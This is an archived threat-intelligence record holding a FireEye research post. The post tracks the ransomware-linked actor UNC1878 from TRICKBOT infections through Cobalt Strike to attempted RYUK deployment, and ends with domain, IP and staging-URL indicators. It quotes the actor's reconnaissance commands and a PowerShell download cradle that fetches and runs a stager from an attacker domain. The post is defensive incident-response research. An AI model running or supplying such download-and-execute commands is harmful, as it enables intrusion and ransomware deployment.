{
    "id": "a912597e-9e7b-4667-95ad-cb71b7cda5e6",
    "created_at": "2023-01-12T15:03:33.622293Z",
    "updated_at": "2025-03-27T02:14:05.643555Z",
    "deleted_at": null,
    "sha1_hash": "140bdb42dd6de64b978ceaa017ed13c965afa538",
    "title": "2020-03-31 - It’s Your Money and They Want It Now - The Cycle of Adversary Pursuit",
    "authors": "",
    "file_creation_date": "2022-05-28T21:42:09Z",
    "file_modification_date": "2022-05-28T21:42:09Z",
    "file_size": 131456,
    "plain_text": "# It’s Your Money and They Want It Now — The Cycle of Adversary Pursuit\n\n**fireeye.com/blog/threat-research/2020/03/the-cycle-of-adversary-pursuit.html**\n\nThreat Research\n\nVan Ta, Aaron Stephens\n\nMar 31, 2020\n\n9 mins read\n\nIncident Response\n\nThreat Research\n\nWhen we discover new intrusions, we ask ourselves questions that will help us understand the totality of the activity set.\n\nHow common is this activity? Is there anything unique or special about this malware or campaign? What is new and what is old in terms\nof TTPs or infrastructure? Is this being seen anywhere else? What information do I have that substantiates the nature of this threat\nactor?\n\nTo track a fast-moving adversary over time, we exploit organic intrusion data, pivot to other data sets, and make that knowledge\nactionable for analysts and incident responders, enabling new discoveries and assessments on the actor. The FireEye Advanced\nPractices team exists to know more about the adversary than anyone else, and by asking and answering questions such as these, we\nenable analyst action in security efforts. In this blog post, we highlight how our cycle of identification, expansion, and discovery was used\nto track a financially motivated actor across FireEye’s global data sets.\n\n**Identification**\n\n[On January 29, 2020, FireEye Managed Defense investigated multiple TRICKBOT deployments against a U.S. based client. Shortly](https://www.fireeye.com/solutions/managed-solutions/managed-defense)\nafter initial deployment, TRICKBOT’s networkDll module ran the following network reconnaissance commands (Figure 1).\n\nipconfig /all\n\nnet config workstation\n\nnet view /all\n\nnet view /all /domain\n\nnltest /domain_trusts\n\nnltest /domain_trusts /all_trusts\n\n\n-----\n\nFigure 1: Initial Reconnaissance\n\nApproximately twenty minutes after reconnaissance, the adversary ran a PowerShell command to download and execute a Cobalt Strike\nHTTPS BEACON stager in memory (Figure 2).\n\ncmd.exe /c powershell.exe -nop –w hidden –c “IEX ((new-object\nnet.webclient).downloadstring(‘hxxps://cylenceprotect[.]com:80/abresgbserthgsbabrt’))”\n\nFigure 2: PowerShell download cradle used to request a Cobalt Strike stager\n\nSix minutes later, Managed Defense identified evidence of enumeration and attempted lateral movement through the BEACON implant.\nManaged Defense alerted the client of the activity and the affected hosts were contained, stopping the intrusion in its tracks. A delta of\napproximately forty-six minutes between a TRICKBOT infection and attempted lateral movement was highly unusual and, along with the\nclever masquerade domain, warranted further examination by our team.\n\nAlthough light, indicators from this intrusion were distinct enough to create an uncategorized threat group, referred to as UNC1878. At\nthe time of initial clustering, UNC1878’s intent was not fully understood due to the rapid containment of the intrusion by Managed\nDefense. By creating this label, we are able to link activity from the Managed Defense investigation into a single entity, allowing us to\nexpand our understanding of this group and track their activity over time. This is especially important when dealing with campaigns\ninvolving mass malware, as it helps delineate the interactive actor from the malware campaign they are leveraging. For more information\n[on our clustering methodology, check out our post about how we analyze, separate, or merge these clusters at scale.](https://www.fireeye.com/resources/clustering-and-associating-attacker-activity-at-scale)\n\n**Expansion**\n\nPivoting on the command and control (C2) domain allowed us to begin building a profile of UNC1878 network infrastructure. WHOIS\nrecords for cylenceprotect[.]com (Figure 3)revealed that the domain was registered on January 27, 2020, with the registrar \"Hosting\nConcepts B.V. d/b/a Openprovider\", less than two days before we saw this domain used in activity impacting the Managed Defense\ncustomer.\n\nDomain Name: cylenceprotect.com\n\nRegistry Domain ID: 2485487352_DOMAIN_COM-VRSN\n\nRegistrar WHOIS Server: whois.registrar.eu\n\nRegistrar URL: http://www.registrar.eu\n\nUpdated Date: 2020-01-28T00:35:43Z\n\nCreation Date: 2020-01-27T23:32:18Z\n\nRegistrar Registration Expiration Date: 2021-01-27T23:32:18Z\n\nRegistrar: Hosting Concepts B.V. d/b/a Openprovider\n\nFigure 3: WHOIS record for the domain cylenceprotect[.]com\n\nTurning our attention to the server, the domain resolved to 45.76.20.140, an IP address owned by the VPS provider Choopa. In addition,\nthe domain used self-hosted name servers ns1.cylenceprotect[.]com and ns2.cylenceprotect[.]com, which also resolved to the Choopa\nIP address. Network scan data for the server uncovered a certificate on port 80 and 443, a snippet of which can be seen in Figure 4.\n\nCertificate:\n\nData:\n\nVersion: 3 (0x2)\n\nSerial Number:\n\n03:a8:60:02:c7:dd:7f:88:5f:2d:86:0d:88:41:e5:3e:25:f0\n\nSignature Algorithm: sha256WithRSAEncryption\n\nIssuer: C=US, O=Let's Encrypt, CN=Let's Encrypt Authority X3\n\nValidity\n\n**Not Before: Jan 28 02:02:14 2020 GMT**\n\nNot After : Apr 27 02:02:14 2020 GMT\n\n**Subject: CN=cylenceprotect[.]com**\n\nFigure 4: TLS Certificate for the domain cylenceprotect[.]com\n\nThe certificate was issued by Let’s Encrypt, with the earliest validity date within 24 hours of the activity detected by Managed Defense,\nsubstantiating the speed in which this threat actor operates. Along with the certificate in Figure 4, we also identified the default\ngenerated, self-signed Cobalt Strike certificate (Figure 5) on port 54546 (50050 by default).\n\n\n-----\n\nCertificate:\n\nData:\n\nVersion: 3 (0x2)\n\nSerial Number: 1843990795 (0x6de9110b)\n\nSignature Algorithm: sha256WithRSAEncryption\n\n**Issuer: C=Earth, ST=Cyberspace, L=Somewhere, O=cobaltstrike, OU=AdvancedPenTesting, CN=Major Cobalt Strike**\n\nValidity\n\n**Not Before: Jan 28 03:06:30 2020 GMT**\n\nNot After : Apr 27 03:06:30 2020 GMT\n\n**Subject: C=Earth, ST=Cyberspace, L=Somewhere, O=cobaltstrike, OU=AdvancedPenTesting, CN=Major Cobalt Strike**\n\nFigure 5: Default Cobalt Strike TLS Certificate used by UNC1878\n\nSimilar to the certificate on port 80 and 443, the earliest validity date was again within 24 hours of the intrusion identified by Managed\nDefense. Continuing analysis on the server, we acquired the BEACON stager and subsequent BEACON payload, which was configured\nto use the [Amazon malleable C2 profile.](https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/amazon.profile)\n\nWhile these indicators may not hold significant weight on their own, together they create a recognizable pattern to fuel proactive\ndiscovery of related infrastructure. We began hunting for servers that exhibited the same characteristics as those used by UNC1878.\nUsing third-party scan data, we quickly identified additional servers that matched a preponderance of UNC1878 tradecraft:\n\nDomains typically comprised of generic IT or security related terms such as “update”, “system”, and “service”.\nDomains registered with “Hosting Concepts B.V. d/b/a Openprovider\" as early as December 19, 2019.\nSelf-hosted name servers.\nLet’s Encrypt certificates on port 80.\nVirtual private servers hosted predominantly by Choopa.\nBEACON payloads configured with the Amazon malleable C2 profile.\nCobalt Strike Teams Servers on non-standard ports.\n\n[Along with certificates matching UNC1878 tradecraft, we also found self-signed Armitage certificates, indicating this group may use](http://www.fastandeasyhacking.com/)\nmultiple offensive security tools.\n\nPivoting on limited indicators extracted from a single Managed Defense intrusion, a small cluster of activity was expanded into a more\ndiverse set of indicators cardinal to UNC1878. While the objective and goal of this threat actor had not yet manifested, the correlation of\ninfrastructure allowed our team to recognize this threat actor’s operations against other customers.\n\n**Discovery**\n\n[With an established modus operandi for UNC1878, our team quickly identified several related intrusions in support of FireEye Mandiant](https://www.fireeye.com/services/incident-response)\ninvestigations over the next week. Within two days of our initial clustering and expansion of UNC1878 from the original Managed\nDefense investigation, Mandiant Incident Responders were investigating activity at a U.S. based medical equipment company with\nseveral indicators we had previously identified and attributed to UNC1878. Attributed domains, payloads and methodologies provided\nconsultants with a baseline to build detections on, as well as a level of confidence in the actor’s capabilities and speed in which they\noperate.\n\nThree days later, UNC1878 was identified during another incident response engagement at a restaurant chain. In this engagement,\nMandiant consultants found evidence of attempted deployment of RYUK ransomware on hundreds of systems, finally revealing\nUNC1878’s desired end goal. In the following weeks, we continued to encounter UNC1878 in various phases of their intrusions at\nseveral Mandiant Incident Response and Managed Defense customers.\n\nWhile services data offers us a depth of understanding into these intrusions, we turn to our product telemetry to understand the breadth\nof activity, getting a better worldview and perspective on the global prevalence of this threat actor. This led to the discovery of an\nUNC1878 intrusion at a technology company, resulting in Mandiant immediately notifying the affected customer. By correlating multiple\nUNC1878 intrusions across our services and product customers, it became evident that the targeting was indiscriminate, a common\ncharacteristic of opportunistic ransomware campaigns.\n\nAlthough initially there were unanswered questions surrounding UNC1878’s intent, we were able to provide valuable insights into their\ncapabilities to our consultants and analysts. In turn, the intrusion data gathered during these engagements continued the cycle of\nbuilding our understanding of UNC1878’s tradecraft, enabling our responders to handle these incidents swiftly in the face of imminent\nransomware deployment.\n\n**Conclusion**\n\nThreat actors continue to use mass malware campaigns to establish footholds into target environments, followed by interactive\noperations focused on deploying ransomware such as RYUK, DOPPLEPAYMER and MAZE. Looking at the overall trend of intrusions\nFireEye responds to, the growing shift from traditional PCI theft to ransomware has allowed threat actors such as UNC1878 to widen\n\n\n-----\n\ntheir scope and increase their tempo, costing organizations millions of dollars due to business disruption and ransom payments.\nHowever, apart from their speed, UNC1878 does not stand out among the increasing number of groups following this trend, and should\nnot be the key takeaway of this blog post.\n\nThe cycle of analysis and discovery used for UNC1878 lies at the core of our team’s mission to rapidly detect and pursue impactful\nadversaries at scale. Starting from a singular intrusion at a Managed Defense client, we were able to discover UNC1878 activity at\nmultiple customers. Using our analysis of the early stages of their activity allowed us to pivot and pursue this actor across otherwise\nunrelated investigations. As we refine and expand our understanding of UNC1878’s tradecraft, our team enables Mandiant and\nManaged Defense to efficiently identify, respond to, and eradicate a financially motivated threat actor whose end goal could cripple\ntargeted organizations. The principles applied in pursuit of this actor are crucial to tracking any adversary and are ultimately how the\nAdvanced Practices team surfaces meaningful activity across the FireEye ecosystem.\n\n**Acknowledgements**\n\nThank you to Andrew Thompson, Dan Perez, Steve Miller, John Gorman and Brendan McKeague for technical review of this content. In\naddition, thank you to the frontline responders harvesting valuable intrusion data that enables our research.\n\n**Indicators of Compromise**\n\n_Domains_\n\naaatus[.]com\navrenew[.]com\nbesttus[.]com\nbigtus[.]com\nbrainschampions[.]com\ncheckwinupdate[.]com\nciscocheckapi[.]com\ncleardefencewin[.]com\ncmdupdatewin[.]com\ncomssite[.]com\nconhostservice[.]com\ncylenceprotect[.]com\ndefenswin[.]com\neasytus[.]com\nfindtus[.]com\nfirsttus[.]com\nfreeallsafe[.]com\nfreeoldsafe[.]com\ngreattus[.]com\nhavesetup[.]net\niexploreservice[.]com\njomamba[.]best\nlivecheckpointsrs[.]com\nlivetus[.]com\nlsassupdate[.]com\nlsasswininfo[.]com\nmicrosoftupdateswin[.]com\nmyservicebooster[.]com\nmyservicebooster[.]net\nmyserviceconnect[.]net\nmyserviceupdater[.]com\nmyyserviceupdater[.]com\nrenovatesystem[.]com\nservice-updater[.]com\nservicesbooster[.]com\nservicesbooster[.]org\nservicesecurity[.]org\nserviceshelpers[.]com\nserviceupdates[.]net\nserviceuphelper[.]com\nsophosdefence[.]com\ntarget-support[.]online\n\n\n-----\n\ntaskshedulewin[.]com\ntimesshifts[.]com\ntopsecurityservice[.]net\ntopservicehelper[.]com\ntopservicesbooster[.]com\ntopservicesecurity[.]com\ntopservicesecurity[.]net\ntopservicesecurity[.]org\ntopservicesupdate[.]com\ntopservicesupdates[.]com\ntopserviceupdater[.]com\nupdate-wind[.]com\nupdatemanagir[.]us\nupdatewinlsass[.]com\nupdatewinsoftr[.]com\nweb-analysis[.]live\nwindefenceinfo[.]com\nwindefens[.]com\nwinsysteminfo[.]com\nwinsystemupdate[.]com\nworldtus[.]com\nyoursuperservice[.]com\n\n_IP Addresses_\n\n31.7.59.141\n45.32.30.162\n45.32.130.5\n45.32.161.213\n45.32.170.9\n45.63.8.219\n45.63.95.187\n45.76.20.140\n45.76.167.35\n45.76.231.195\n45.77.58.172\n45.77.89.31\n45.77.98.157\n45.77.119.212\n45.77.153.72\n45.77.206.105\n63.209.33.131\n66.42.97.225\n66.42.99.79\n79.124.60.117\n80.240.18.106\n81.17.25.210\n95.179.147.215\n95.179.210.8\n95.179.215.228\n96.30.192.141\n96.30.193.57\n104.156.227.250\n104.156.245.0\n104.156.250.132\n104.156.255.79\n104.238.140.239\n104.238.190.126\n108.61.72.29\n108.61.90.90\n108.61.176.237\n108 61 209 123\n\n\n-----\n\n108.61.242.184\n140.82.5.67\n140.82.10.222\n140.82.27.146\n140.82.60.155\n144.202.12.197\n144.202.83.4\n149.28.15.247\n149.28.35.35\n149.28.50.31\n149.28.55.197\n149.28.81.19\n149.28.113.9\n149.28.122.130\n149.28.246.25\n149.248.5.240\n149.248.56.113\n149.248.58.11\n151.106.56.223\n155.138.135.182\n155.138.214.247\n155.138.216.133\n155.138.224.221\n207.148.8.61\n207.148.15.31\n207.148.21.17\n207.246.67.70\n209.222.108.106\n209.250.255.172\n216.155.157.249\n217.69.15.175\n\n_BEACON Staging URLs_\n\nhxxp://104.156.255[.]79:80/avbcbgfyhunjmkmk\nhxxp://149.28.50[.]31:80/adsrxdfcffdxfdsgfxzxds\nhxxp://149.28.81[.]19:80/ajdlkashduiqwhuyeu12312g3yugshdahqjwgye1g2uy31u1\nhxxp://45.32.161[.]213:80/ephfusaybuzabegaexbkakskjfgksajgbgfckskfnrdgnkhdsnkghdrngkhrsngrhgcngyggfxbgufgenwfxwgfeuyenfgx\nhxxp://45.63.8[.]219:80/ajhgfrtyujhytr567uhgfrt6y789ijhg\nhxxp://66.42.97[.]225:80/aqedfy345yu9876red45f6g78j90\nhxxp://findtus[.]com/akkhujhbjcjcjhufuuljlvu\nhxxp://thedemocraticpost[.]com/kflmgkkjdfkmkfl\nhxxps://brainschampions[.]com:443/atrsgrtehgsetrh5ge\nhxxps://ciscocheckapi[.]com:80/adsgsergesrtvfdvsa\nhxxps://cylenceprotect[.]com:80/abresgbserthgsbabrt\nhxxps://havesetup[.]net/afgthyjuhtgrfety\nhxxps://servicesbooster[.]org:443/sfer4f54\nhxxps://servicesecurity[.]org:443/fuhvbjk\nhxxps://timesshifts[.]com:443/akjhtyrdtfyguhiugyft\nhxxps://timesshifts[.]com:443/ry56rt6yh5rth\nhxxps://update-wind[.]com/aergerhgrhgeradgerg\nhxxps://updatemanagir[.]us:80/afvSfaewfsdZFAesf\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-03-31 - It’s Your Money and They Want It Now - The Cycle of Adversary Pursuit.pdf"
    ],
    "report_names": [
        "2020-03-31 - It’s Your Money and They Want It Now - The Cycle of Adversary Pursuit.pdf"
    ],
    "threat_actors": [
        {
            "id": "ab9d6b30-7c60-4d0b-8f49-e2e913c28508",
            "created_at": "2022-10-25T16:07:24.584775Z",
            "updated_at": "2025-03-27T02:02:10.289029Z",
            "deleted_at": null,
            "main_name": "UNC1878",
            "aliases": [],
            "source_name": "ETDA:UNC1878",
            "tools": [
                "Agentemis",
                "BEERBOT",
                "BazarBackdoor",
                "BazarCall",
                "BazarLoader",
                "Cobalt Strike",
                "CobaltStrike",
                "KEGTAP",
                "Ryuk",
                "Team9Backdoor",
                "bazaloader",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "63061658-5810-4f01-9620-7eada7e9ae2e",
            "created_at": "2022-10-25T15:50:23.752974Z",
            "updated_at": "2025-03-27T02:00:55.538582Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "Wizard Spider",
                "UNC1878",
                "TEMP.MixMaster",
                "Grim Spider",
                "FIN12",
                "GOLD BLACKBURN",
                "ITG23",
                "Periwinkle Tempest",
                "DEV-0193"
            ],
            "source_name": "MITRE:Wizard Spider",
            "tools": [
                "TrickBot",
                "AdFind",
                "BITSAdmin",
                "Bazar",
                "LaZagne",
                "Nltest",
                "GrimAgent",
                "Dyre",
                "Ryuk",
                "Conti",
                "Emotet",
                "Rubeus",
                "Mimikatz",
                "Diavol",
                "PsExec",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "0a4f4edc-ea8c-4a30-8ded-35394e29de01",
            "created_at": "2023-01-06T13:46:39.178183Z",
            "updated_at": "2025-03-27T02:00:03.014032Z",
            "deleted_at": null,
            "main_name": "UNC1878",
            "aliases": [],
            "source_name": "MISPGALAXY:UNC1878",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "53f39e5d-6d69-4402-b03c-ec2dbe045788",
            "created_at": "2024-06-19T02:03:08.132007Z",
            "updated_at": "2025-03-27T02:05:17.401832Z",
            "deleted_at": null,
            "main_name": "GOLD ULRICK",
            "aliases": [
                "UNC1878 ",
                "Grim Spider "
            ],
            "source_name": "Secureworks:GOLD ULRICK",
            "tools": [
                " Buer Loader",
                " Cobalt Strike",
                " Conti",
                " Diavol",
                " Powershell Empire",
                " Ryuk",
                " SystemBC",
                " Team9 (aka BazarLoader)",
                " TrickBot",
                "Bloodhound"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535813,
    "ts_updated_at": 1743041645,
    "ts_creation_date": 1653774129,
    "ts_modification_date": 1653774129,
    "files": {
        "pdf": "https://archive.orkl.eu/140bdb42dd6de64b978ceaa017ed13c965afa538.pdf",
        "text": "https://archive.orkl.eu/140bdb42dd6de64b978ceaa017ed13c965afa538.txt",
        "img": "https://archive.orkl.eu/140bdb42dd6de64b978ceaa017ed13c965afa538.jpg"
    }
}